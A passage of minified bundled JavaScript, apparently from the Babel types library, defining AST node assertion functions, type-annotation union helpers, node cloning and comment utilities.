.assertTSThisType=VQ1;Rq.assertTSTupleType=RQ1;Rq.assertTSType=a41;Rq.assertTSTypeAliasDeclaration=xQ1;Rq.assertTSTypeAnnotation=oQ1;Rq.assertTSTypeAssertion=yQ1;Rq.assertTSTypeElement=n41;Rq.assertTSTypeLiteral=jQ1;Rq.assertTSTypeOperator=SQ1;Rq.assertTSTypeParameter=X41;Rq.assertTSTypeParameterDeclaration=eQ1;Rq.assertTSTypeParameterInstantiation=tQ1;Rq.assertTSTypePredicate=MQ1;Rq.assertTSTypeQuery=FQ1;Rq.assertTSTypeReference=ZQ1;Rq.assertTSUndefinedKeyword=HQ1;Rq.assertTSUnionType=DQ1;Rq.assertTSUnknownKeyword=UQ1;Rq.assertTSVoidKeyword=KQ1;Rq.assertTaggedTemplateExpression=fJ1;Rq.assertTemplateElement=gJ1;Rq.assertTemplateLiteral=hJ1;Rq.assertTerminatorless=U41;Rq.assertThisExpression=zJ1;Rq.assertThisTypeAnnotation=u71;Rq.assertThrowStatement=HJ1;Rq.assertTopicReference=g51;Rq.assertTryStatement=UJ1;Rq.assertTupleExpression=v51;Rq.assertTupleTypeAnnotation=c71;Rq.assertTypeAlias=p71;Rq.assertTypeAnnotation=d71;Rq.assertTypeCastExpression=i71;Rq.assertTypeParameter=r71;Rq.assertTypeParameterDeclaration=n71;Rq.assertTypeParameterInstantiation=a71;Rq.assertTypeScript=r41;Rq.assertTypeofTypeAnnotation=l71;Rq.assertUnaryExpression=KJ1;Rq.assertUnaryLike=E41;Rq.assertUnionTypeAnnotation=s71;Rq.assertUpdateExpression=VJ1;Rq.assertUserWhitespacable=P41;Rq.assertV8IntrinsicIdentifier=S51;Rq.assertVariableDeclaration=BJ1;Rq.assertVariableDeclarator=qJ1;Rq.assertVariance=o71;Rq.assertVoidPattern=u51;Rq.assertVoidTypeAnnotation=t71;Rq.assertWhile=q41;Rq.assertWhileStatement=ZJ1;Rq.assertWithStatement=MJ1;Rq.assertYieldExpression=yJ1;var OX1=cJ(),E5=uJ();function w(X,J,Q){if(!OX1.default(X,J,Q))throw new Error(`Expected type "${X}" with option ${JSON.stringify(Q)}, but instead got "${J.type}".`)}function RX1(X,J){w("ArrayExpression",X,J)}function AX1(X,J){w("AssignmentExpression",X,J)}function NX1(X,J){w("BinaryExpression",X,J)}function LX1(X,J){w("InterpreterDirective",X,J)}function DX1(X,J){w("Directive",X,J)}function wX1(X,J){w("DirectiveLiteral",X,J)}function IX1(X,J){w("BlockStatement",X,J)}function CX1(X,J){w("BreakStatement",X,J)}function PX1(X,J){w("CallExpression",X,J)}function SX1(X,J){w("CatchClause",X,J)}function TX1(X,J){w("ConditionalExpression",X,J)}function _X1(X,J){w("ContinueStatement",X,J)}function EX1(X,J){w("DebuggerStatement",X,J)}function $X1(X,J){w("DoWhileStatement",X,J)}function kX1(X,J){w("EmptyStatement",X,J)}function bX1(X,J){w("ExpressionStatement",X,J)}function vX1(X,J){w("File",X,J)}function xX1(X,J){w("ForInStatement",X,J)}function fX1(X,J){w("ForStatement",X,J)}function gX1(X,J){w("FunctionDeclaration",X,J)}function hX1(X,J){w("FunctionExpression",X,J)}function yX1(X,J){w("Identifier",X,J)}function mX1(X,J){w("IfStatement",X,J)}function uX1(X,J){w("LabeledStatement",X,J)}function cX1(X,J){w("StringLiteral",X,J)}function lX1(X,J){w("NumericLiteral",X,J)}function pX1(X,J){w("NullLiteral",X,J)}function dX1(X,J){w("BooleanLiteral",X,J)}function iX1(X,J){w("RegExpLiteral",X,J)}function rX1(X,J){w("LogicalExpression",X,J)}function nX1(X,J){w("MemberExpression",X,J)}function aX1(X,J){w("NewExpression",X,J)}function sX1(X,J){w("Program",X,J)}function oX1(X,J){w("ObjectExpression",X,J)}function tX1(X,J){w("ObjectMethod",X,J)}function eX1(X,J){w("ObjectProperty",X,J)}function XJ1(X,J){w("RestElement",X,J)}function JJ1(X,J){w("ReturnStatement",X,J)}function QJ1(X,J){w("SequenceExpression",X,J)}function YJ1(X,J){w("ParenthesizedExpression",X,J)}function WJ1(X,J){w("SwitchCase",X,J)}function GJ1(X,J){w("SwitchStatement",X,J)}function zJ1(X,J){w("ThisExpression",X,J)}function HJ1(X,J){w("ThrowStatement",X,J)}function UJ1(X,J){w("TryStatement",X,J)}function KJ1(X,J){w("UnaryExpression",X,J)}function VJ1(X,J){w("UpdateExpression",X,J)}function BJ1(X,J){w("VariableDeclaration",X,J)}function qJ1(X,J){w("VariableDeclarator",X,J)}function ZJ1(X,J){w("WhileStatement",X,J)}function MJ1(X,J){w("WithStatement",X,J)}function FJ1(X,J){w("AssignmentPattern",X,J)}function jJ1(X,J){w("ArrayPattern",X,J)}function OJ1(X,J){w("ArrowFunctionExpression",X,J)}function RJ1(X,J){w("ClassBody",X,J)}function AJ1(X,J){w("ClassExpression",X,J)}function NJ1(X,J){w("ClassDeclaration",X,J)}function LJ1(X,J){w("ExportAllDeclaration",X,J)}function DJ1(X,J){w("ExportDefaultDeclaration",X,J)}function wJ1(X,J){w("ExportNamedDeclaration",X,J)}function IJ1(X,J){w("ExportSpecifier",X,J)}function CJ1(X,J){w("ForOfStatement",X,J)}function PJ1(X,J){w("ImportDeclaration",X,J)}function SJ1(X,J){w("ImportDefaultSpecifier",X,J)}function TJ1(X,J){w("ImportNamespaceSpecifier",X,J)}function _J1(X,J){w("ImportSpecifier",X,J)}function EJ1(X,J){w("ImportExpression",X,J)}function $J1(X,J){w("MetaProperty",X,J)}function kJ1(X,J){w("ClassMethod",X,J)}function bJ1(X,J){w("ObjectPattern",X,J)}function vJ1(X,J){w("SpreadElement",X,J)}function xJ1(X,J){w("Super",X,J)}function fJ1(X,J){w("TaggedTemplateExpression",X,J)}function gJ1(X,J){w("TemplateElement",X,J)}function hJ1(X,J){w("TemplateLiteral",X,J)}function yJ1(X,J){w("YieldExpression",X,J)}function mJ1(X,J){w("AwaitExpression",X,J)}function uJ1(X,J){w("Import",X,J)}function cJ1(X,J){w("BigIntLiteral",X,J)}function lJ1(X,J){w("ExportNamespaceSpecifier",X,J)}function pJ1(X,J){w("OptionalMemberExpression",X,J)}function dJ1(X,J){w("OptionalCallExpression",X,J)}function iJ1(X,J){w("ClassProperty",X,J)}function rJ1(X,J){w("ClassAccessorProperty",X,J)}function nJ1(X,J){w("ClassPrivateProperty",X,J)}function aJ1(X,J){w("ClassPrivateMethod",X,J)}function sJ1(X,J){w("PrivateName",X,J)}function oJ1(X,J){w("StaticBlock",X,J)}function tJ1(X,J){w("ImportAttribute",X,J)}function eJ1(X,J){w("AnyTypeAnnotation",X,J)}function X71(X,J){w("ArrayTypeAnnotation",X,J)}function J71(X,J){w("BooleanTypeAnnotation",X,J)}function Q71(X,J){w("BooleanLiteralTypeAnnotation",X,J)}function Y71(X,J){w("NullLiteralTypeAnnotation",X,J)}function W71(X,J){w("ClassImplements",X,J)}function G71(X,J){w("DeclareClass",X,J)}function z71(X,J){w("DeclareFunction",X,J)}function H71(X,J){w("DeclareInterface",X,J)}function U71(X,J){w("DeclareModule",X,J)}function K71(X,J){w("DeclareModuleExports",X,J)}function V71(X,J){w("DeclareTypeAlias",X,J)}function B71(X,J){w("DeclareOpaqueType",X,J)}function q71(X,J){w("DeclareVariable",X,J)}function Z71(X,J){w("DeclareExportDeclaration",X,J)}function M71(X,J){w("DeclareExportAllDeclaration",X,J)}function F71(X,J){w("DeclaredPredicate",X,J)}function j71(X,J){w("ExistsTypeAnnotation",X,J)}function O71(X,J){w("FunctionTypeAnnotation",X,J)}function R71(X,J){w("FunctionTypeParam",X,J)}function A71(X,J){w("GenericTypeAnnotation",X,J)}function N71(X,J){w("InferredPredicate",X,J)}function L71(X,J){w("InterfaceExtends",X,J)}function D71(X,J){w("InterfaceDeclaration",X,J)}function w71(X,J){w("InterfaceTypeAnnotation",X,J)}function I71(X,J){w("IntersectionTypeAnnotation",X,J)}function C71(X,J){w("MixedTypeAnnotation",X,J)}function P71(X,J){w("EmptyTypeAnnotation",X,J)}function S71(X,J){w("NullableTypeAnnotation",X,J)}function T71(X,J){w("NumberLiteralTypeAnnotation",X,J)}function _71(X,J){w("NumberTypeAnnotation",X,J)}function E71(X,J){w("ObjectTypeAnnotation",X,J)}function $71(X,J){w("ObjectTypeInternalSlot",X,J)}function k71(X,J){w("ObjectTypeCallProperty",X,J)}function b71(X,J){w("ObjectTypeIndexer",X,J)}function v71(X,J){w("ObjectTypeProperty",X,J)}function x71(X,J){w("ObjectTypeSpreadProperty",X,J)}function f71(X,J){w("OpaqueType",X,J)}function g71(X,J){w("QualifiedTypeIdentifier",X,J)}function h71(X,J){w("StringLiteralTypeAnnotation",X,J)}function y71(X,J){w("StringTypeAnnotation",X,J)}function m71(X,J){w("SymbolTypeAnnotation",X,J)}function u71(X,J){w("ThisTypeAnnotation",X,J)}function c71(X,J){w("TupleTypeAnnotation",X,J)}function l71(X,J){w("TypeofTypeAnnotation",X,J)}function p71(X,J){w("TypeAlias",X,J)}function d71(X,J){w("TypeAnnotation",X,J)}function i71(X,J){w("TypeCastExpression",X,J)}function r71(X,J){w("TypeParameter",X,J)}function n71(X,J){w("TypeParameterDeclaration",X,J)}function a71(X,J){w("TypeParameterInstantiation",X,J)}function s71(X,J){w("UnionTypeAnnotation",X,J)}function o71(X,J){w("Variance",X,J)}function t71(X,J){w("VoidTypeAnnotation",X,J)}function e71(X,J){w("EnumDeclaration",X,J)}function X51(X,J){w("EnumBooleanBody",X,J)}function J51(X,J){w("EnumNumberBody",X,J)}function Q51(X,J){w("EnumStringBody",X,J)}function Y51(X,J){w("EnumSymbolBody",X,J)}function W51(X,J){w("EnumBooleanMember",X,J)}function G51(X,J){w("EnumNumberMember",X,J)}function z51(X,J){w("EnumStringMember",X,J)}function H51(X,J){w("EnumDefaultedMember",X,J)}function U51(X,J){w("IndexedAccessType",X,J)}function K51(X,J){w("OptionalIndexedAccessType",X,J)}function V51(X,J){w("JSXAttribute",X,J)}function B51(X,J){w("JSXClosingElement",X,J)}function q51(X,J){w("JSXElement",X,J)}function Z51(X,J){w("JSXEmptyExpression",X,J)}function M51(X,J){w("JSXExpressionContainer",X,J)}function F51(X,J){w("JSXSpreadChild",X,J)}function j51(X,J){w("JSXIdentifier",X,J)}function O51(X,J){w("JSXMemberExpression",X,J)}function R51(X,J){w("JSXNamespacedName",X,J)}function A51(X,J){w("JSXOpeningElement",X,J)}function N51(X,J){w("JSXSpreadAttribute",X,J)}function L51(X,J){w("JSXText",X,J)}function D51(X,J){w("JSXFragment",X,J)}function w51(X,J){w("JSXOpeningFragment",X,J)}function I51(X,J){w("JSXClosingFragment",X,J)}function C51(X,J){w("Noop",X,J)}function P51(X,J){w("Placeholder",X,J)}function S51(X,J){w("V8IntrinsicIdentifier",X,J)}function T51(X,J){w("ArgumentPlaceholder",X,J)}function _51(X,J){w("BindExpression",X,J)}function E51(X,J){w("Decorator",X,J)}function $51(X,J){w("DoExpression",X,J)}function k51(X,J){w("ExportDefaultSpecifier",X,J)}function b51(X,J){w("RecordExpression",X,J)}function v51(X,J){w("TupleExpression",X,J)}function x51(X,J){w("DecimalLiteral",X,J)}function f51(X,J){w("ModuleExpression",X,J)}function g51(X,J){w("TopicReference",X,J)}function h51(X,J){w("PipelineTopicExpression",X,J)}function y51(X,J){w("PipelineBareFunction",X,J)}function m51(X,J){w("PipelinePrimaryTopicReference",X,J)}function u51(X,J){w("VoidPattern",X,J)}function c51(X,J){w("TSParameterProperty",X,J)}function l51(X,J){w("TSDeclareFunction",X,J)}function p51(X,J){w("TSDeclareMethod",X,J)}function d51(X,J){w("TSQualifiedName",X,J)}function i51(X,J){w("TSCallSignatureDeclaration",X,J)}function r51(X,J){w("TSConstructSignatureDeclaration",X,J)}function n51(X,J){w("TSPropertySignature",X,J)}function a51(X,J){w("TSMethodSignature",X,J)}function s51(X,J){w("TSIndexSignature",X,J)}function o51(X,J){w("TSAnyKeyword",X,J)}function t51(X,J){w("TSBooleanKeyword",X,J)}function e51(X,J){w("TSBigIntKeyword",X,J)}function XQ1(X,J){w("TSIntrinsicKeyword",X,J)}function JQ1(X,J){w("TSNeverKeyword",X,J)}function QQ1(X,J){w("TSNullKeyword",X,J)}function YQ1(X,J){w("TSNumberKeyword",X,J)}function WQ1(X,J){w("TSObjectKeyword",X,J)}function GQ1(X,J){w("TSStringKeyword",X,J)}function zQ1(X,J){w("TSSymbolKeyword",X,J)}function HQ1(X,J){w("TSUndefinedKeyword",X,J)}function UQ1(X,J){w("TSUnknownKeyword",X,J)}function KQ1(X,J){w("TSVoidKeyword",X,J)}function VQ1(X,J){w("TSThisType",X,J)}function BQ1(X,J){w("TSFunctionType",X,J)}function qQ1(X,J){w("TSConstructorType",X,J)}function ZQ1(X,J){w("TSTypeReference",X,J)}function MQ1(X,J){w("TSTypePredicate",X,J)}function FQ1(X,J){w("TSTypeQuery",X,J)}function jQ1(X,J){w("TSTypeLiteral",X,J)}function OQ1(X,J){w("TSArrayType",X,J)}function RQ1(X,J){w("TSTupleType",X,J)}function AQ1(X,J){w("TSOptionalType",X,J)}function NQ1(X,J){w("TSRestType",X,J)}function LQ1(X,J){w("TSNamedTupleMember",X,J)}function DQ1(X,J){w("TSUnionType",X,J)}function wQ1(X,J){w("TSIntersectionType",X,J)}function IQ1(X,J){w("TSConditionalType",X,J)}function CQ1(X,J){w("TSInferType",X,J)}function PQ1(X,J){w("TSParenthesizedType",X,J)}function SQ1(X,J){w("TSTypeOperator",X,J)}function TQ1(X,J){w("TSIndexedAccessType",X,J)}function _Q1(X,J){w("TSMappedType",X,J)}function EQ1(X,J){w("TSTemplateLiteralType",X,J)}function $Q1(X,J){w("TSLiteralType",X,J)}function kQ1(X,J){w("TSExpressionWithTypeArguments",X,J)}function bQ1(X,J){w("TSInterfaceDeclaration",X,J)}function vQ1(X,J){w("TSInterfaceBody",X,J)}function xQ1(X,J){w("TSTypeAliasDeclaration",X,J)}function fQ1(X,J){w("TSInstantiationExpression",X,J)}function gQ1(X,J){w("TSAsExpression",X,J)}function hQ1(X,J){w("TSSatisfiesExpression",X,J)}function yQ1(X,J){w("TSTypeAssertion",X,J)}function mQ1(X,J){w("TSEnumBody",X,J)}function uQ1(X,J){w("TSEnumDeclaration",X,J)}function cQ1(X,J){w("TSEnumMember",X,J)}function lQ1(X,J){w("TSModuleDeclaration",X,J)}function pQ1(X,J){w("TSModuleBlock",X,J)}function dQ1(X,J){w("TSImportType",X,J)}function iQ1(X,J){w("TSImportEqualsDeclaration",X,J)}function rQ1(X,J){w("TSExternalModuleReference",X,J)}function nQ1(X,J){w("TSNonNullExpression",X,J)}function aQ1(X,J){w("TSExportAssignment",X,J)}function sQ1(X,J){w("TSNamespaceExportDeclaration",X,J)}function oQ1(X,J){w("TSTypeAnnotation",X,J)}function tQ1(X,J){w("TSTypeParameterInstantiation",X,J)}function eQ1(X,J){w("TSTypeParameterDeclaration",X,J)}function X41(X,J){w("TSTypeParameter",X,J)}function J41(X,J){w("Standardized",X,J)}function Q41(X,J){w("Expression",X,J)}function Y41(X,J){w("Binary",X,J)}function W41(X,J){w("Scopable",X,J)}function G41(X,J){w("BlockParent",X,J)}function z41(X,J){w("Block",X,J)}function H41(X,J){w("Statement",X,J)}function U41(X,J){w("Terminatorless",X,J)}function K41(X,J){w("CompletionStatement",X,J)}function V41(X,J){w("Conditional",X,J)}function B41(X,J){w("Loop",X,J)}function q41(X,J){w("While",X,J)}function Z41(X,J){w("ExpressionWrapper",X,J)}function M41(X,J){w("For",X,J)}function F41(X,J){w("ForXStatement",X,J)}function j41(X,J){w("Function",X,J)}function O41(X,J){w("FunctionParent",X,J)}function R41(X,J){w("Pureish",X,J)}function A41(X,J){w("Declaration",X,J)}function N41(X,J){w("FunctionParameter",X,J)}function L41(X,J){w("PatternLike",X,J)}function D41(X,J){w("LVal",X,J)}function w41(X,J){w("TSEntityName",X,J)}function I41(X,J){w("Literal",X,J)}function C41(X,J){w("Immutable",X,J)}function P41(X,J){w("UserWhitespacable",X,J)}function S41(X,J){w("Method",X,J)}function T41(X,J){w("ObjectMember",X,J)}function _41(X,J){w("Property",X,J)}function E41(X,J){w("UnaryLike",X,J)}function $41(X,J){w("Pattern",X,J)}function k41(X,J){w("Class",X,J)}function b41(X,J){w("ImportOrExportDeclaration",X,J)}function v41(X,J){w("ExportDeclaration",X,J)}function x41(X,J){w("ModuleSpecifier",X,J)}function f41(X,J){w("Accessor",X,J)}function g41(X,J){w("Private",X,J)}function h41(X,J){w("Flow",X,J)}function y41(X,J){w("FlowType",X,J)}function m41(X,J){w("FlowBaseAnnotation",X,J)}function u41(X,J){w("FlowDeclaration",X,J)}function c41(X,J){w("FlowPredicate",X,J)}function l41(X,J){w("EnumBody",X,J)}function p41(X,J){w("EnumMember",X,J)}function d41(X,J){w("JSX",X,J)}function i41(X,J){w("Miscellaneous",X,J)}function r41(X,J){w("TypeScript",X,J)}function n41(X,J){w("TSTypeElement",X,J)}function a41(X,J){w("TSType",X,J)}function s41(X,J){w("TSBaseType",X,J)}function o41(X,J){E5.default("assertNumberLiteral","assertNumericLiteral"),w("NumberLiteral",X,J)}function t41(X,J){E5.default("assertRegexLiteral","assertRegExpLiteral"),w("RegexLiteral",X,J)}function e41(X,J){E5.default("assertRestProperty","assertRestElement"),w("RestProperty",X,J)}function X21(X,J){E5.default("assertSpreadProperty","assertSpreadElement"),w("SpreadProperty",X,J)}function J21(X,J){E5.default("assertModuleDeclaration","assertImportOrExportDeclaration"),w("ModuleDeclaration",X,J)}});var Dq=c((Nq)=>{Object.defineProperty(Nq,"__esModule",{value:!0});Nq.default=void 0;var C8=l9(),eo1=Nq.default=mH1;function mH1(X){switch(X){case"string":return C8.stringTypeAnnotation();case"number":return C8.numberTypeAnnotation();case"undefined":return C8.voidTypeAnnotation();case"boolean":return C8.booleanTypeAnnotation();case"function":return C8.genericTypeAnnotation(C8.identifier("Function"));case"object":return C8.genericTypeAnnotation(C8.identifier("Object"));case"symbol":return C8.genericTypeAnnotation(C8.identifier("Symbol"));case"bigint":return C8.anyTypeAnnotation()}throw new Error("Invalid typeof value: "+X)}});var yW=c((Cq)=>{Object.defineProperty(Cq,"__esModule",{value:!0});Cq.default=Iq;var $5=i0();function wq(X){return $5.isIdentifier(X)?X.name:`${X.id.name}.${wq(X.qualification)}`}function Iq(X){let J=Array.from(X),Q=new Map,Y=new Map,W=new Set,z=[];for(let G=0;G<J.length;G++){let H=J[G];if(!H)continue;if(z.includes(H))continue;if($5.isAnyTypeAnnotation(H))return[H];if($5.isFlowBaseAnnotation(H)){Y.set(H.type,H);continue}if($5.isUnionTypeAnnotation(H)){if(!W.has(H.types))J.push(...H.types),W.add(H.types);continue}if($5.isGenericTypeAnnotation(H)){let U=wq(H.id);if(Q.has(U)){let K=Q.get(U);if(K.typeParameters){if(H.typeParameters)K.typeParameters.params.push(...H.typeParameters.params),K.typeParameters.params=Iq(K.typeParameters.params)}else K=H.typeParameters}else Q.set(U,H);continue}z.push(H)}for(let[,G]of Y)z.push(G);for(let[,G]of Q)z.push(G);return z}});var Sq=c((Pq)=>{Object.defineProperty(Pq,"__esModule",{value:!0});Pq.default=pH1;var cH1=l9(),lH1=yW();function pH1(X){let J=lH1.default(X);if(J.length===1)return J[0];else return cH1.unionTypeAnnotation(J)}});var $q=c((Eq)=>{Object.defineProperty(Eq,"__esModule",{value:!0});Eq.default=_q;var nJ=i0();function Tq(X){return nJ.isIdentifier(X)?X.name:nJ.isThisExpression(X)?"this":`${X.right.name}.${Tq(X.left)}`}function _q(X){let J=Array.from(X),Q=new Map,Y=new Map,W=new Set,z=[];for(let G=0;G<J.length;G++){let H=J[G];if(!H)continue;if(z.includes(H))continue;if(nJ.isTSAnyKeyword(H))return[H];if(nJ.isTSBaseType(H)){Y.set(H.type,H);continue}if(nJ.isTSUnionType(H)){if(!W.has(H.types))J.push(...H.types),W.add(H.types);continue}let U="typeParameters";if(nJ.isTSTypeReference(H)&&H[U]){let K=H[U],V=Tq(H.typeName);if(Q.has(V)){let B=Q.get(V),Z=B[U];if(Z)Z.params.push(...K.params),Z.params=_q(Z.params);else B=K}else Q.set(V,H);continue}z.push(H)}for(let[,G]of Y)z.push(G);for(let[,G]of Q)z.push(G);return z}});var bq=c((kq)=>{Object.defineProperty(kq,"__esModule",{value:!0});kq.default=sH1;var rH1=l9(),nH1=$q(),aH1=i0();function sH1(X){let J=X.map((Y)=>{return aH1.isTSTypeAnnotation(Y)?Y.typeAnnotation:Y}),Q=nH1.default(J);if(Q.length===1)return Q[0];else return rH1.tsUnionType(Q)}});var mW=c((xq)=>{Object.defineProperty(xq,"__esModule",{value:!0});xq.buildUndefinedNode=tH1;var vq=l9();function tH1(){return vq.unaryExpression("void",vq.numericLiteral(0),!0)}});var s6=c((mq)=>{Object.defineProperty(mq,"__esModule",{value:!0});mq.default=X31;var fq=Y8(),gq=i0(),{hasOwn:s8}={hasOwn:Function.call.bind(Object.prototype.hasOwnProperty)};function hq(X,J,Q,Y){if(X&&typeof X.type==="string")return yq(X,J,Q,Y);return X}function uW(X,J,Q,Y){if(Array.isArray(X))return X.map((W)=>hq(W,J,Q,Y));return hq(X,J,Q,Y)}function X31(X,J=!0,Q=!1){return yq(X,J,Q,new Map)}function yq(X,J=!0,Q=!1,Y){if(!X)return X;let{type:W}=X,z={type:X.type};if(gq.isIdentifier(X)){if(z.name=X.name,s8(X,"optional")&&typeof X.optional==="boolean")z.optional=X.optional;if(s8(X,"typeAnnotation"))z.typeAnnotation=J?uW(X.typeAnnotation,!0,Q,Y):X.typeAnnotation;if(s8(X,"decorators"))z.decorators=J?uW(X.decorators,!0,Q,Y):X.decorators}else if(!s8(fq.NODE_FIELDS,W))throw new Error(`Unknown node type: "${W}"`);else for(let G of Object.keys(fq.NODE_FIELDS[W]))if(s8(X,G))if(J)z[G]=gq.isFile(X)&&G==="comments"?w4(X.comments,J,Q,Y):uW(X[G],!0,Q,Y);else z[G]=X[G];if(s8(X,"loc"))if(Q)z.loc=null;else z.loc=X.loc;if(s8(X,"leadingComments"))z.leadingComments=w4(X.leadingComments,J,Q,Y);if(s8(X,"innerComments"))z.innerComments=w4(X.innerComments,J,Q,Y);if(s8(X,"trailingComments"))z.trailingComments=w4(X.trailingComments,J,Q,Y);if(s8(X,"extra"))z.extra=Object.assign({},X.extra);return z}function w4(X,J,Q,Y){if(!X||!J)return X;return X.map((W)=>{let z=Y.get(W);if(z)return z;let{type:G,value:H,loc:U}=W,K={type:G,value:H,loc:U};if(Q)K.loc=null;return Y.set(W,K),K})}});var cq=c((uq)=>{Object.defineProperty(uq,"__esModule",{value:!0});uq.default=Y31;var Q31=s6();function Y31(X){return Q31.default(X,!1)}});var pq=c((lq)=>{Object.defineProperty(lq,"__esModule",{value:!0});lq.default=z31;var G31=s6();function z31(X){return G31.default(X)}});var iq=c((dq)=>{Object.defineProperty(dq,"__esModule",{value:!0});dq.default=K31;var U31=s6();function K31(X){return U31.default(X,!0,!0)}});var nq=c((rq)=>{Object.defineProperty(rq,"__esModule",{value:!0});rq.default=q31;var B31=s6();function q31(X){return B31.default(X,!1,!0)}});var cW=c((aq)=>{Object.defineProperty(aq,"__esModule",{value:!0});aq.default=M31;function M31(X,J,Q){if(!Q||!X)return X;let Y=`${J}Comments`;if(X[Y])if(J==="leading")X[Y]=Q.concat(X[Y]);else X[Y].push(...Q);else X[Y]=Q;return X}});var oq=c((sq)=>{Object.defineProperty(sq,"__esModule",{value:!0});sq.default=O31;var j31=cW();function O31(X,J,Q,Y){return j31.default(X,J,[{type:Y?"CommentLine":"CommentBlock",value:Q}])}});var I4=c((tq)=>{Object.defineProperty(tq,"__esModule",{value:!0});tq.default=A31;function A31(X,J,Q){if(J&&Q)J[X]=Array.from(new Set([].concat(J[X],Q[X]).filter(Boolean)))}});var lW=c((eq)=>{Object.defineProperty(eq,"__esModule",{value:!0});eq.default=D31;var L31=I4();function D31(X,J){L31.default("innerComments",X,J)}});var pW=c((XZ)=>{Object.defineProperty(XZ,"__esModule",{value:!0});XZ.default=C31;var I31=I4();function C31(X,J){I31.default("leadingComments",X,J)}});var dW=c((JZ)=>{Object.defineProperty(JZ,"__esModule",{value:!0});JZ.default=T31;var S31=I4();function T31(X,J){S31.default("trailingComments",X,J)}});var iW=c((QZ)=>{Object.defineProperty(QZ,"__esModule",{value:!0});QZ.default=b31;var E31=dW(),$31=pW(),k31=lW();function b31(X,J){return E31.default(X,J),$31.default(X,J),k31.default(X,J),X}});var WZ=c((YZ)=>{Object.defineProperty(YZ,"__esModule",{value:!0});YZ.default=f31;var x31=pJ();function f31(X){return x31.COMMENT_KEYS.forEach((J)=>{X[J]=null}),X}});var HZ=c((GZ)=>{Object.defineProperty(GZ,"__esModule",{value:!0});GZ.WHILE_TYPES=GZ.USERWHITESPACABLE_TYPES=GZ.UNARYLIKE_TYPES=GZ.TYPESCRIPT_TYPES=GZ.TSTYPE_TYPES=GZ.TSTYPEELEMENT_TYPES=GZ.TSENTITYNAME_TYPES=GZ.TSBASETYPE_TYPES=GZ.TERMINATORLESS_TYPES=GZ.STATEMENT_TYPES=GZ.STANDARDIZED_TYPES=GZ.SCOPABLE_TYPES=GZ.PUREISH_TYPES=GZ.PROPERTY_TYPES=GZ.PRIVATE_TYPES=GZ.PATTERN_TYPES=GZ.PATTERNLIKE_TYPES=GZ.OBJECTMEMBER_TYPES=GZ.MODULESPECIFIER_TYPES=GZ.MODULEDECLARATION_TYPES=GZ.MISCELLANEOUS_TYPES=GZ.METHOD_TYPES=GZ.LVAL_TYPES=GZ.LOOP_TYPES=GZ.LITERAL_TYPES=GZ.JSX_TYPES=GZ.IMPORTOREXPORTDECLARATION_TYPES=GZ.IMMUTABLE_TYPES=GZ.FUNCTION_TYPES=GZ.FUNCTIONPARENT_TYPES=GZ.FUNCTIONPARAMETER_TYPES=GZ.FOR_TYPES=GZ.FORXSTATEMENT_TYPES=GZ.FLOW_TYPES=GZ.FLOWTYPE_TYPES=GZ.FLOWPREDICATE_TYPES=GZ.FLOWDECLARATION_TYPES=GZ.FLOWBASEANNOTATION_TYPES=GZ.EXPRESSION_TYPES=GZ.EXPRESSIONWRAPPER_TYPES=GZ.EXPORTDECLARATION_TYPES=GZ.ENUMMEMBER_TYPES=GZ.ENUMBODY_TYPES=GZ.DECLARATION_TYPES=GZ.CONDITIONAL_TYPES=GZ.COMPLETIONSTATEMENT_TYPES=GZ.CLASS_TYPES=GZ.BLOCK_TYPES=GZ.BLOCKPARENT_TYPES=GZ.BINARY_TYPES=GZ.ACCESSOR_TYPES=void 0;var n1=Y8(),At1=GZ.STANDARDIZED_TYPES=n1.FLIPPED_ALIAS_KEYS.Standardized,Nt1=GZ.EXPRESSION_TYPES=n1.FLIPPED_ALIAS_KEYS.Expression,Lt1=GZ.BINARY_TYPES=n1.FLIPPED_ALIAS_KEYS.Binary,Dt1=GZ.SCOPABLE_TYPES=n1.FLIPPED_ALIAS_KEYS.Scopable,wt1=GZ.BLOCKPARENT_TYPES=n1.FLIPPED_ALIAS_KEYS.BlockParent,It1=GZ.BLOCK_TYPES=n1.FLIPPED_ALIAS_KEYS.Block,Ct1=GZ.STATEMENT_TYPES=n1.FLIPPED_ALIAS_KEYS.Statement,Pt1=GZ.TERMINATORLESS_TYPES=n1.FLIPPED_ALIAS_KEYS.Terminatorless,St1=GZ.COMPLETIONSTATEMENT_TYPES=n1.FLIPPED_ALIAS_KEYS.CompletionStatement,Tt1=GZ.CONDITIONAL_TYPES=n1.FLIPPED_ALIAS_KEYS.Conditional,_t1=GZ.LOOP_TYPES=n1.FLIPPED_ALIAS_KEYS.Loop,Et1=GZ.WHILE_TYPES=n1.FLIPPED_ALIAS_KEYS.While,$t1=GZ.EXPRESSIONWRAPPER_TYPES=n1.FLIPPED_ALIAS_KEYS.ExpressionWrapper,kt1=GZ.FOR_TYPES=n1.FLIPPED_ALIAS_KEYS.For,bt1=GZ.FORXSTATEMENT_TYPES=n1.FLIPPED_ALIAS_KEYS.ForXStatement,vt1=GZ.FUNCTION_TYPES=n1.FLIPPED_ALIAS_KEYS.Function,xt1=GZ.FUNCTIONPARENT_TYPES=n1.FLIPPED_ALIAS_KEYS.FunctionParent,ft1=GZ.PUREISH_TYPES=n1.FLIPPED_ALIAS_KEYS.Pureish,gt1=GZ.DECLARATION_TYPES=n1.FLIPPED_ALIAS_KEYS.Declaration,ht1=GZ.FUNCTIONPARAMETER_TYPES=n1.FLIPPED_ALIAS_KEYS.FunctionParameter,yt1=GZ.PATTERNLIKE_TYPES=n1.FLIPPED_ALIAS_KEYS.PatternLike,mt1=GZ.LVAL_TYPES=n1.FLIPPED_ALIAS_KEYS.LVal,ut1=GZ.TSENTITYNAME_TYPES=n1.FLIPPED_ALIAS_KEYS.TSEntityName,ct1=GZ.LITERAL_TYPES=n1.FLIPPED_ALIAS_KEYS.Literal,lt1=GZ.IMMUTABLE_TYPES=n1.FLIPPED_ALIAS_KEYS.Immutable,pt1=GZ.USERWHITESPACABLE_TYPES=n1.FLIPPED_ALIAS_KEYS.UserWhitespacable,dt1=GZ.METHOD_TYPES=n1.FLIPPED_ALIAS_KEYS.Method,it1=GZ.OBJECTMEMBER_TYPES=n1.FLIPPED_ALIAS_KEYS.ObjectMember,rt1=GZ.PROPERTY_TYPES=n1.FLIPPED_ALIAS_KEYS.Property,nt1=GZ.UNARYLIKE_TYPES=n1.FLIPPED_ALIAS_KEYS.UnaryLike,at1=GZ.PATTERN_TYPES=n1.FLIPPED_ALIAS_KEYS.Pattern,st1=GZ.CLASS_TYPES=n1.FLIPPED_ALIAS_KEYS.Class,h31=GZ.IMPORTOREXPORTDECLARATION_TYPES=n1.FLIPPED_ALIAS_KEYS.ImportOrExportDeclaration,ot1=